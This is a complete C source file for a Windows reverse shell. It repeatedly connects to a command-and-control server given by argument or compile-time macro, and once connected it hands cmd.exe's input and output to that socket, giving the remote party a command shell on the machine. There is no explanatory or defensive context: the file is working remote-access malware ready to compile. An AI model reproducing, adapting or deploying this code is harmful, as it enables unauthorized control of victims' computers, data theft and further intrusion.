#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

unsigned int rand_interval(unsigned int min, unsigned int max)
{
    int r;
    const unsigned int range = 1 + max - min;
    const unsigned int buckets = RAND_MAX / range;
    const unsigned int limit = buckets * range;

    do {
        r = rand();
    } while (r >= limit);

    return min + (r / buckets);
}

void RunShell(char *C2Server, int C2Port)
{
    while (true) {
        Sleep(rand_interval(3000, 6000));

        SOCKET C2Sock;
        SOCKADDR_IN C2Addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);

        C2Sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        C2Addr.sin_family = AF_INET;
        
        C2Addr.sin_addr.s_addr = inet_addr(C2Server);
        C2Addr.sin_port = htons(C2Port);

        if (WSAConnect(C2Sock, (SOCKADDR *)&C2Addr, sizeof(C2Addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(C2Sock);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(C2Sock, RecvData, DEFAULT_BUFLEN, 0);

            if (RecvCode <= 0) {
                closesocket(C2Sock);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;

                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)C2Sock;

                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                memset(RecvData, 0, sizeof(RecvData));

                int RecvCode = recv(C2Sock, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvData <= 0) {
                    closesocket(C2Sock);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }

            }
        }
    }
}

int main(int argc, char **argv)
{
    // FreeConsole();
    if (argc == 3) {
        int port = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = IP;
        int port = PORT;
        RunShell(host, port);
    }

    return 0;
}